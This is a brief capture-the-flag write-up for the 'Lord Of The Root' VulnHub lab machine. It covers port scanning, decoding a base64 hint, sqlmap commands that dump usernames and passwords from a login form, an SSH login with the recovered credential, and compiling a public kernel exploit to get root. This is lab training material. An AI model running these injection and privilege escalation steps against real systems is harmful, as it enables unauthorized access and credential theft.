<h1>Lord Of The Root Write-Up</h1>

<h2>NMAP</h2>

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux;
protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
1337/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```

**NOTE : IF PORT 1337 IS NOT OPEN YOU NEED TO KNOCK I UPLOADED .sh  SCRIPT TO DO THAT ;-**

<h3>PORT 1337</h3>

In the source code of any 404 page there is a base64 encoded code :
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Lord%20Of%20The%20Root/Images/base.png)

"THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh"

on decoding this code 2 times using (base64 -d ) gives :


**/978345210/index.php**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Lord%20Of%20The%20Root/Images/decoded.png)

<h3>Sql Injection :</h3>

```
sqlmap -o -u http://192.168.30.140:1337/978345210/index.php --forms --dbs
sqlmap -o -u http://192.168.30.140:1337/978345210/index.php --forms -D Webapp
-T Users -C id,username,password --dump
```
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Lord%20Of%20The%20Root/Images/sqlmap-passwords.png)

```
ssh smeagol@192.168.56.35
password : MyPreciousR00t 
```

<h2>Privilege Escalation :</h2>

Exploit : https://www.exploit-db.com/exploits/39166

gcc exploit.c -o exploit 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Lord%20Of%20The%20Root/Images/priv%20esc%20and%20flag.png)

